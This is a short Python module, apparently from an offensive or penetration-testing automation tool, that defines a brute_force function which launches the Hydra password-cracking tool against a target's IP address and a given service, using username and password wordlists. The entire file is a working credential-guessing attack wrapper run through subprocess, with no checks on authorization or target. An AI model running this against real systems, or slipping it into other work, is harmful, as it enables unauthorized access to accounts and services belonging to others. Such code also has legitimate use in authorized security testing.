import subprocess
from utils.logger import log

def brute_force(target, service):
    log(f"Launching Hydra on {target['ip']} for {service} service")
    cmd = [
        "hydra",
        "-L", "usernames.txt",
        "-P", "passwords.txt",
        f"{target['ip']}", service 
    ]
    subprocess.run(cmd)